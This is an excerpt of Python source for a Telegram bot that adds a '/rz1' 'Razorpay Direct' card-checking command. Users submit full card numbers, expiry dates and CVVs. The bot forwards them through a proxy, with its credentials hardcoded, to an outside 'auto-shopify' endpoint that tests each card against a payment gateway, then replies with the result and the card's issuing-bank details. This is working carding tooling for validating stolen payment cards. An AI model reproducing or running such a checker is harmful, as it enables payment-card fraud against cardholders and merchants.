...
async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    cmds_message = (
        ...
        "🔹 <b>𝙍𝙖𝙯𝙤𝙧𝙥𝙖𝙮</b>\n"
        f"{bullet_link} <code>/rz1</code> - Razorpay Direct 50$\n"
...
# --- RZ1 Processor ---
async def process_rz1(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
    """
    Process a /rz1 command: check Razorpay Direct card and display response + BIN info.
    """
    ...
    try:
        ...
        if len(parts) != 4:
            await update.message.reply_text(
                "❌ Invalid format.\nUse: `/rz1 1234567812345678|12|2028|123`",
                parse_mode=ParseMode.MARKDOWN_V2
            )
            return
        ...
        api_url = (
            f"https://auto-shopify-6cz4.onrender.com/index.php"
            f"?site=https://razorpay.example.com"
            f"&cc={full_card}"
            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
        )
        ...
        # --- Final formatted message ---
        final_msg = (
            f"◇━━〔 <b>𝑹𝒂𝒛𝒐𝒓𝒑𝒂𝒚 𝑫𝒊𝒓𝒆𝒄𝒕</b> 〕━━◇\n"
            f"{bullet_link} 𝐂𝐚𝐫𝐝 ➵ <code>{full_card}</code>\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝑹𝒂𝒛𝒐𝒓𝒑𝒂𝒚 𝑫𝒊𝒓𝒆𝒄𝒕 𝟓𝟎$\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i>{display_response}</i>\n"
            "――――――――――――――――\n"
            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝 ➵ <code>{escape(brand)}</code>\n"
            f"{bullet_link} 𝐁𝐚𝐧𝐤 ➵ <code>{escape(issuer)}</code>\n"
        ...
        logger.exception("Error in processing /rz1")
        try:
            await update.message.reply_text(
                f"❌ Error: <code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
...
async def rz1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ...
    if not payload:
        await update.message.reply_text(
            "⚠️ Usage: <code>/rz1 card|mm|yy|cvv</code>\n"
            "Or reply to a message containing a card.",
            parse_mode=ParseMode.HTML
        )
        return
    ...
    # --- Run in background ---
    asyncio.create_task(process_rz1(update, context, payload))
...
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    status_message = (
        ...
        f"{BULLET_LINK} 𝐑𝐀𝐌 𝐔𝐬𝐚𝐠𝐞 ➳ <code>{used_swap:.2f}GB / {total_swap:.2f}GB ({swap_percent:.1f}%)</code>\n"
...
def register_force_join(application):
    ...
    application.add_handler(CommandHandler("rz1", force_join(rz1_command)))
